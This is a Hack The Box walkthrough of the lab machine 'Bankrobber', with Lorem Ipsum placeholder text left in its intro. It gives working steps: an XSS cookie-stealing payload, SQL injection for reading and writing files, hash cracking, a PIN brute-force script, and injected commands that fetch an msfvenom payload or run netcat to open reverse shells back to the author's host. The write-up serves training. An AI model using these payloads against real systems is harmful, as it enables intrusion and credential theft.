---
layout: single
title: Bankrobber - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-02-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-bankrobber/bankrobber_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bankrobber/bankrobber_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/bankrobber# nmapAutomatorDirb.sh 10.10.10.154 All
  PORT     STATE SERVICE      VERSION
  80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
  |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
  |_http-title: E-coin
  443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
  |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
  |_http-title: E-coin
  | ssl-cert: Subject: commonName=localhost
  | Not valid before: 2009-11-10T23:48:47
  |_Not valid after:  2019-11-08T23:48:47
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn:
  |_  http/1.1
  445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
  3306/tcp open  mysql        MariaDB (unauthorized)
  Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

  | http-enum:
  |   /admin/: Possible admin folder
  |   /admin/index.php: Possible admin folder
  |   /Admin/: Possible admin folder
  |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
  |   /icons/: Potentially interesting folder w/ directory listing
  |   /img/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
  |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.39 (win64) openssl/1.1.1b php/7.3.4'
  |_  /user/: Potentially interesting folder

  DIRB:
  + http://10.10.10.154:80/elements.html (CODE:200|SIZE:34812)
  + http://10.10.10.154:80/generic.html (CODE:200|SIZE:13343)
  + http://10.10.10.154:80/index.php (CODE:200|SIZE:8245)
  + http://10.10.10.154:80/Index.php (CODE:200|SIZE:8245)
  + http://10.10.10.154:80/link.php (CODE:200|SIZE:0)
  + http://10.10.10.154:80/login.php (CODE:302|SIZE:0)
  + http://10.10.10.154:80/Login.php (CODE:302|SIZE:0)
  + http://10.10.10.154:80/logout.php (CODE:302|SIZE:0)
  + http://10.10.10.154:80/register.php (CODE:200|SIZE:0)

  NIKTO:
  + /notes.txt: This might be interesting...

  SSLSCAN:
  SSL Certificate:
  Signature Algorithm: sha1WithRSAEncryption
  RSA Key Strength:    1024

  Subject:  localhost
  Issuer:   localhost

  Not valid before: Nov 10 23:48:47 2009 GMT
  Not valid after:  Nov  8 23:48:47 2019 GMT

  - Hostname: Bankrobber
  - SQL: MariaDB
  - SSL Cert is Invalid, expired 2019-11-08.
  - notes.txt
    - Move all files from the default Xampp folder: TODO
    - Encode comments for every IP address except localhost: Done
    - Take a break..


2. The site is vulnerable to XSS. Create an account and test to transfer E-coin. When transfering an admin must approve the transfer.
   The Comment field is vulnerable to XSS, we can get the admin cookie by tricking him to connect back to us.

   Start a nc session locally and then do the XSS.

    Amount: 1
    ID Of Addressee: 1
    Comment: <script>new Image().src="http://10.10.14.12/bogus.php?output="%2bdocument.cookie;</script>

    root@p3:/opt/htb/machines/bankrobber/10.10.10.154# nc -lvnp 80
      listening on [any] 80 ...
      connect to [10.10.14.12] from (UNKNOWN) [10.10.10.154] 49706
      GET /bogus.php?output=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1
      Referer: http://localhost/admin/index.php
      User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
      Accept: */*
      Connection: Keep-Alive
      Accept-Encoding: gzip, deflate
      Accept-Language: nl-NL,en,*
      Host: 10.10.14.12

    Decode the base64 encoded username and password

    root@p3:/opt/htb/machines/bankrobber/10.10.10.154# echo YWRtaW4= | base64 -d
      admin
    root@p3:/opt/htb/machines/bankrobber/10.10.10.154# echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d
      Hopelessromantic

    Creds: admin:Hopelessromantic


3. We are now able to login as admin and get a few more options, backdoorchecker.php where we are allowed to execute 'dir'
   but only from local host. And search.php where we can query the database for users.

   "search.php/term=1" is injectable, we can enumerate the database manually or using sqlmap. For simplicity, i chose to
   go with the second option - sqlmap.

    root@p3:/opt/htb/machines/bankrobber/10.10.10.154# sqlmap -u https://bankrobber.htb/admin/search.php --cookie="id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D" --data term=1 --current-user --current-db --passwords --tables
      ..
      database management system users password hashes:
      [*] pma [1]:
          password hash: NULL
      [*] root [1]:
          password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
      ..
      [16:49:43] [INFO] fetching tables for databases: 'bankrobber, information_schema, mysql, performance_schema, phpmyadmin, test'
      Database: bankrobber
      [3 tables]
      +----------------------------------------------------+
      | balance                                            |
      | hold                                               |
      | users                                              |
      +----------------------------------------------------+

    root@p3:/opt/htb/machines/bankrobber/10.10.10.154# sqlmap -u https://bankrobber.htb/admin/search.php --cookie="id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D" --data term=1 --search -D bankrobber -T users
      ..
      Database: bankrobber
      Table: users
      [4 entries]
      +----+------------------+----------+
      | id | password         | username |
      +----+------------------+----------+
      | 1  | Hopelessromantic | admin    |
      | 2  | gio              | gio      |
      | 3  | test123          | p3       |
      | 4  | test             | test     |
      +----+------------------+----------+


    We find a second pair of credentials (gio:gio), and also a password hash for root (F435725A173757E57BD36B09048B8B610FF4D0C4)


    Manual example in Burp:
      term=1' UNION ALL SELECT 1,concat(id,0x3a,username,0x3a,password),3 FROM users;
        <td>1:admin:Hopelessromantic</td>
        <td>2:gio:gio</td>


4. Crack the password hash using hashcat, using rockyou.txt won't give us the password - however using crackstation.net finds
   the password for us. I went ahead and added found password (Welkom1!) to rockyou.txt and ran hashcat again for poc.

   root@p3:/opt/htb/machines/bankrobber# echo Welkom1! >> /usr/share/wordlists/rockyou.txt
   root@p3:/opt/htb/machines/bankrobber# hashcat -a0 -m300 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
     Session..........: hashcat
     Status...........: Cracked
     Hash.Type........: MySQL4.1/MySQL5
     Hash.Target......: f435725a173757e57bd36b09048b8b610ff4d0c4
     Time.Started.....: Mon Feb  3 17:09:03 2020 (1 sec)
     Time.Estimated...: Mon Feb  3 17:09:04 2020 (0 secs)
     Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
     Guess.Queue......: 1/1 (100.00%)
     Speed.#1.........: 15110.2 kH/s (3.15ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
     Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
     Progress.........: 14344387/14344387 (100.00%)
     Rejected.........: 0/14344387 (0.00%)
     Restore.Point....: 14155776/14344387 (98.69%)
     Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
     Candidates.#1....: 0213JR -> Welkom1!
     Hardware.Mon.#1..: Temp: 56c Util: 33% Core:1770MHz Mem:6000MHz Bus:16

     Started: Mon Feb  3 17:08:59 2020
     Stopped: Mon Feb  3 17:09:04 2020

   root@p3:/opt/htb/machines/bankrobber# cat cracked.txt
   f435725a173757e57bd36b09048b8b610ff4d0c4:Welkom1!

   NOTE: root:Welkom1!            (MariaDB - MySQL)
   NOTE: admin:Hopelessromantic   (WebApp)
   NOTE: gio:gio                  (WebApp)


5. We are unable to login anywhere with the found creds, so we continue to enumerate the box using the SQLi vuln.
   File Read and Write is possible, we can use this to get a webshell and/or enumerate interesting files such as backdoorchecker.php.

     POST /admin/search.php HTTP/1.1
     Host: bankrobber.htb
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
     Accept: */*
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Referer: https://bankrobber.htb/admin/
     Content-type: application/x-www-form-urlencoded
     Content-Length: 69
     Connection: close
     Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D

   File Read:
    term=1' UNION ALL SELECT 1,LOAD_FILE('C:/xampp/htdocs/admin/backdoorchecker.php),3;--

   File Write:
    term=1' UNION ALL SELECT 1,'this is the content of my test-file',3 into outfile 'C:/xampp/test.txt';--
    term=1' UNION ALL SELECT 1,load_file('C:/xampp/test.txt'),3;--


6. Backdoorchecker.php is secured in two way;
    First - Can only execute the command "dir", however it doesn't cancel the escape characters ; | etc.
    Second - Commands can only be ran from ::1

   The Second part is a issue, no matter how much we tamper with the HTTP Header (X-Forwarded-From etc.) it wont work. We need to
   find a way to get past this issue, and luckily there are two options - the hard way and the easy way.

    Hard - Create a javascript file to send a POST request to backdoorchecker.php with desired command in the "cmd" variable,
           and call it using the XSS vulnerability that gave us the admin cookie. Example:
              <iframe src="http://10.10.14.12/ping.js" height="0" width="0"></iframe> invisible iframe

    Easy - When logged in as admin, enumerating the site we find a javascript file called system.js. Within there's a function,
           callSys, used to trigger the commands towards backdoorchecker.php. We can call this script and function as a new user,
           from the comment filed (where we previously executed our XSS to get admin cookie) to get RCE. Example:

              <script type="text/javascript">callSys('dir|ping 10.10.14.12');</script>

              root@p3:/opt/htb/machines/bankrobber# tcpdump -i tun0 icmp
                tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
                listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
                11:58:13.611598 IP bankrobber.htb > p3: ICMP echo request, id 1, seq 5, length 40
                11:58:13.611631 IP p3 > bankrobber.htb: ICMP echo reply, id 1, seq 5, length 40


7. Use the RCE to trigger a reverse shell and grab user.txt

    Craft the payload:
    root@p3:/opt/htb/machines/bankrobber# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4488 -f exe > br-rev.exe
      [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
      [-] No arch selected, selecting arch: x86 from the payload
      No encoder or badchars specified, outputting raw payload
      Payload size: 341 bytes
      Final size of exe file: 73802 bytes

    Trigger the payload/reverse shell from the comments field:
    <script type="text/javascript">callSys('dir|//10.10.14.12/pub-share/br-rev.exe');</script>

    Capture the shell, and grab user.txt:
    msf5 exploit(multi/handler) > run
      [*] Started reverse TCP handler on 10.10.14.12:4488
      [*] Sending stage (180291 bytes) to 10.10.10.154
      [*] Meterpreter session 1 opened (10.10.14.12:4488 -> 10.10.10.154:56865) at 2020-02-05 13:05:25 +0100

    meterpreter > sysinfo
      Computer        : BANKROBBER
      OS              : Windows 10 (10.0 Build 14393).
      Architecture    : x64
      System Language : nl_NL
      Domain          : WORKGROUP
      Logged On Users : 3
      Meterpreter     : x86/windows

    meterpreter > shell
      Process 4552 created.
      Channel 1 created.
      Microsoft Windows [Version 10.0.14393]
      (c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

    C:\xampp\htdocs\admin>whoami
      bankrobber\cortin
    C:\Users\Cortin\Desktop>type user.txt
      f635346600876a43441cf1c6e94769ac


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerate the box to try to find a way towards root. We find the executable bankv2.exe running on port 910. We are unable to
   download the file, so instead we setup a port forward to access it locally.

meterpreter > netstat
  Connection list
  ===============
      Proto  Local address       Remote address    State        User  Inode  PID/Program name
      -----  -------------       --------------    -----        ----  -----  ----------------
      tcp    0.0.0.0:135         0.0.0.0:*         LISTEN       0     0      732/svchost.exe
      tcp    0.0.0.0:910         0.0.0.0:*         LISTEN       0     0      2160/bankv2.exe

meterpreter > ls
  Listing: C:\
  ============

  Mode                 Size               Type  Last modified                    Name
  ----                 ----               ----  -------------                    ----
  100777/rwxrwxrwx     57937              fil   2019-04-25 01:10:31 +0200        bankv2.exe

meterpreter > download bankv2.exe
  [*] Downloading: bankv2.exe -> bankv2.exe
  [-] core_channel_open: Operation failed: Access is denied.


2. We can't download and investigate the file, so instead we setup portforwarding to reach the service locally.

    meterpreter > portfwd add -l 910 -p 910 -r 10.10.10.154
      [*] Local TCP relay created: :910 <-> 10.10.10.154:910

    root@p3:/opt/htb/machines/bankrobber# telnet 127.0.0.1 910
      Trying 127.0.0.1...
      Connected to 127.0.0.1.
      Escape character is '^]'.
       --------------------------------------------------------------
       Internet E-Coin Transfer System
       International Bank of Sun church
                                              v0.1 by Gio & Cneeliz
       --------------------------------------------------------------
       Please enter your super secret 4 digit PIN code to login:
       [$] 1111
       [!] Access denied, disconnecting client....


    Instead of enumerating the PIN Code manually we write a simple python brute force script.
    After a lot of trial and error, the is the script I came up with that gave the correct PIN:

      import telnetlib
      from time import sleep

      def main():
          host = 'localhost'
          port = 910
          for i in range(0000,9999):
              connection = telnetlib.Telnet(host,port)
              response = connection.read_until('[$] ')
              print response
              pin = format(i,'04d')
              commandstr = pin + '\n'
              print ' Trying PIN: ' + commandstr
              connection.write(commandstr)
              sleep(2)
              response_str = connection.read_until('\n')
              if("[!] Access denied, disconnecting client...." in response_str):
                  print " Wrong PIN, trying next one!"
                  continue
              else:
                  print " PIN Found!"
                  print response_str
                  print " ### Final PIN: " + format(i,'04d') + " ###"
                  break
          return

      if __name__ == '__main__':
          main()


    root@p3:/opt/htb/machines/bankrobber# brute-pin.py
      --------------------------------------------------------------
      Internet E-Coin Transfer System
      International Bank of Sun church
                                             v0.1 by Gio & Cneeliz
      --------------------------------------------------------------
      Please enter your super secret 4 digit PIN code to login:
      [$]
      Trying PIN: 0021

      Got response.
      [$] PIN is correct, access granted!

      ### Correct PIN: 0021 ###


3. We found the PIN, however manually executing telnet and entering the PIN still gives us '[!] Access denied'. Continue to enumerate
   the service and what happens after we enter correct PIN by capturing and printing all the responses. Doing so we find that a second
   type of input is needed - transfer amount.

     ..
     [$] PIN is correct, access granted!

     ### Correct PIN: 0021 ###
     --------------------------------------------------------------
     Please enter the amount of e-coins you would like to transfer:
     [$] .........
     [!] You waited too long, disconnecting client....

   We create a new script to capture the second input parameter (starting with '[$]' again) and try to send some data. We start by
   trying to execute a simple ping, doing so gives us the following response:

     [$] PIN is correct, access granted!
     --------------------------------------------------------------
     Please enter the amount of e-coins you would like to transfer:
     [$]
     Executing RCE: |cmd.exe /c "ping 10.10.14.21"
     [$] Transfering $|cmd.exe /c "ping 10.10.14.21" using our e-coin transfer application.
     [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

     [$] Transaction in progress, you can safely disconnect...

   This doesn't really give us anything. I try again but this time flood the input by sending '9999999999999999999999999999999999999999999999999'
   and we get an interesting response:

     [$] PIN is correct, access granted!
     --------------------------------------------------------------
     Please enter the amount of e-coins you would like to transfer:
     [$]
     Executing RCE: 9999999999999999999999999999999999999999999999999
     [$] Transfering $9999999999999999999999999999999999999999999999999 using our e-coin transfer application.
     [$] Executing e-coin transfer tool: 99999999999999999

     [$] Transaction in progress, you can safely disconnect...

   The executing row changed, now instead of executing transfer.exe it will try to execute '99999999999999999'. Notice that we lost
   a lot of 9's from our input compared to the output.

   root@p3:/opt/htb/machines/bankrobber# echo 99999999999999999 | wc -c
    18
   root@p3:/opt/htb/machines/bankrobber# echo 9999999999999999999999999999999999999999999999999 | wc -c
    50

   There seems to be a max limit of characters, so lets try to modify our script to add a padding of characters before our RCE.

     [$] PIN is correct, access granted!
     --------------------------------------------------------------
     Please enter the amount of e-coins you would like to transfer:
     [$]
     Executing RCE: 99999999999999999999999999999999cmd.exe /c "ping 10.10.14.21"
     [$] Transfering $99999999999999999999999999999999cmd.exe /c "ping 10.10.14.21" using our e-coin transfer application.
     [$] Executing e-coin transfer tool: cmd.exe /c "ping 10.10.14.21"

     [$] Transaction in progress, you can safely disconnect...

   root@p3:/opt/htb/machines/bankrobber# tcpdump -i tun0 icmp
     tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
     listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
     10:43:55.390230 IP bankrobber.htb > p3: ICMP echo request, id 1, seq 13, length 40
     10:43:55.390271 IP p3 > bankrobber.htb: ICMP echo reply, id 1, seq 13, length 40
     10:43:56.397467 IP bankrobber.htb > p3: ICMP echo request, id 1, seq 14, length 40
     10:43:56.397506 IP p3 > bankrobber.htb: ICMP echo reply, id 1, seq 14, length 40
     10:43:57.412784 IP bankrobber.htb > p3: ICMP echo request, id 1, seq 15, length 40
     10:43:57.412822 IP p3 > bankrobber.htb: ICMP echo reply, id 1, seq 15, length 40
     10:43:58.428235 IP bankrobber.htb > p3: ICMP echo request, id 1, seq 16, length 40
     10:43:58.428256 IP p3 > bankrobber.htb: ICMP echo reply, id 1, seq 16, length 40

   We got code execution!


4. Use the RCE to gain a reverse shell as admin, and grab root.txt.

    root@p3:/opt/htb/machines/bankrobber# python privesc.py
     --------------------------------------------------------------
     Internet E-Coin Transfer System
     International Bank of Sun church
                                            v0.1 by Gio & Cneeliz
     --------------------------------------------------------------
     Please enter your super secret 4 digit PIN code to login:
     [$]
     Entering: 0021

     PIN Correct!
     [$] PIN is correct, access granted!

     --------------------------------------------------------------
     Please enter the amount of e-coins you would like to transfer:
     [$]
     Executing RCE: //10.10.14.21/pub-share/nc64.exe 10.10.14.21 4499 -e powershell

     ######################################
     ###                                ###
     ###  RCE Complete - Happy Hacking  ###
     ###                                ###
     ######################################

    root@p3:/opt/htb/machines/bankrobber# nc -lvnp 4499
      listening on [any] 4499 ...
      connect to [10.10.14.21] from (UNKNOWN) [10.10.10.154] 50702
      Windows PowerShell
      Copyright (C) 2016 Microsoft Corporation. All rights reserved.

    PS C:\Windows\system32> whoami
      nt authority\system
    PS C:\Users\admin\Desktop> type root.txt
      aa65d8e6216585ea636eb07d4a59b197


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

XSS
  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#javascript-keylogger
  https://www.ivoidwarranties.tech/posts/pentesting-tuts/website-pentesting/xss/
  https://stackoverflow.com/questions/1045845/how-to-call-a-javascript-function-from-php

SQLi
  https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8
  https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2
  http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

JS POST Request:
  https://stackoverflow.com/questions/692196/post-request-javascript

XML HTTP:
  https://www.w3schools.com/xml/xml_http.asp
  https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp

Python Script:
  https://docs.python.org/release/2.5.2/lib/typesseq-strings.html
  https://blog.anshumanonline.com/bandit25/
```